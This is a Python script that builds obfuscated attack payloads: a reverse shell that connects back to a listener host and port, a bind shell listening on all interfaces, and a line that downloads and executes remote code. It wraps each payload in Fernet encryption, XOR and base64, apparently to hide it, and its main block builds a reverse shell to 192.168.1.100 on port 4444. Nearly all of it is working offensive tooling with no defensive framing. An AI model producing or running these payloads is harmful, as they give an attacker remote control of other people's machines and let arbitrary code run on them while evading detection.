#!/usr/bin/env python3
import json
import time
import random
import hashlib
import base64
from cryptography.fernet import Fernet

class PayloadBuilder:
    def __init__(self):
        self._s = bytearray(random.getrandbits(8) for _ in range(32))
        self._k = Fernet.generate_key()
        self._f = Fernet(self._k)

    def _h(self, d):
        return hashlib.sha256(str(d).encode() + self._s).hexdigest()

    def _b64e(self, d):
        return base64.b64encode(d).decode()

    def _b64d(self, s):
        return base64.b64decode(s)

    def _x(self, b):
        return bytes([a ^ b for a, b in zip(b, self._s * (len(b)//32+1))])

    def _e(self, d):
        e = self._f.encrypt(d)
        return self._b64e(self._x(e))

    def _d(self, s):
        d = self._x(self._b64d(s))
        return self._f.decrypt(d)

    def build(self, ptype, params):
        payload = {"type": ptype, "params": params, "ts": time.time(), "id": self._h(ptype + str(params))}
        if ptype == "reverse_shell":
            payload["code"] = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{params['lhost']}\",{params['lport']}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        elif ptype == "bind_shell":
            payload["code"] = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{params['port']}));s.listen(1);cl,addr=s.accept();os.dup2(cl.fileno(),0); os.dup2(cl.fileno(),1); os.dup2(cl.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        elif ptype == "download_exec":
            payload["code"] = f"import requests;exec(requests.get('{params['url']}').text)"
        else:
            payload["code"] = ""
        return self._e(json.dumps(payload).encode())

    def decode(self, enc):
        d = self._d(enc)
        return json.loads(d.decode())

if __name__ == "__main__":
    pb = PayloadBuilder()
    p1 = pb.build("reverse_shell", {"lhost": "192.168.1.100", "lport": 4444})
    print("encoded:", p1)
    p2 = pb.decode(p1)
    print("decoded:", p2)